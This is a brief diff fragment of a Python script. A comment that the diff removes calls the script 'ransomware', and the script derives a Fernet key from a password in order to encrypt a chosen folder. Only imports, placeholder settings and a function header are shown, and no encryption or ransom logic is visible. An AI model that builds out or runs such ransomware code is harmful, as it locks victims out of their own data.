@@ -13,8 +13,8 @@ import base64
 from hashlib import sha256
 from cryptography.fernet import Fernet
 
-FOLDER_TO_ENCRYPT = "path/to/your/folder"  # Taken from your input, modify this to the folder you want to encrypt
-SECRET_PASSWORD = "your_secure_password"  # The ransomware will use this password to derive the encryption key
+FOLDER_TO_ENCRYPT = "path/to/your/folder"  
+SECRET_PASSWORD = "your_secure_password"  
 
 def generate_key_from_password(password: str) -> bytes:
     """Derives a secure 32-byte key from a plain text password."""
